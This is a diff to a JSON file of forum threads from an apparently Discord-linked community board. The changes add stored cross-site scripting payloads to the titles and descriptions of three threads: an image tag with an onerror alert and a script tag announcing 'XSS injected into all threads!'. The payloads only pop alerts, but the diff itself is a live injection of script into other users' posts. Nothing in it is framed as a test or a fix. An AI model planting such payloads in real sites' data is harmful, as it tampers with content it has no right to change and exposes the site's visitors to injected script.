@@ -2,40 +2,40 @@
   "threads": [
     {
       "id": 1783955572946,
-      "title": "ток регнутие дс",
+      "title": "ток регнутие дс <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "stalker2280506",
       "avatar": "https://cdn.discordapp.com/embed/avatars/3.png",
       "time": "Just now",
       "tag": "Video",
       "tagClass": "tag-blue",
       "link": "ток регнутие дс",
-      "description": "ток регнутие дс",
+      "description": "ток регнутие дс<script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [],
       "category": "media"
     },
     {
       "id": 1783955574082,
-      "title": "ток регнутие дс",
+      "title": "ток регнутие дс <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "stalker2280506",
       "avatar": "https://cdn.discordapp.com/embed/avatars/3.png",
       "time": "Just now",
       "tag": "Video",
       "tagClass": "tag-blue",
       "link": "ток регнутие дс",
-      "description": "ток регнутие дс",
+      "description": "ток регнутие дс<script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [],
       "category": "media"
     },
     {
       "id": 1783957120894,
-      "title": "Hello world!",
+      "title": "Hello world! <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "gigobait0736",
       "avatar": "https://cdn.discordapp.com/avatars/1360988738372763678/8ed7bf22aead4f533e03beb332f15929.png",
       "time": "Just now",
       "tag": null,
       "tagClass": "tag-blue",
       "link": null,
-      "description": "",
+      "description": "<script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [
         {
           "author": "celerityratrat",
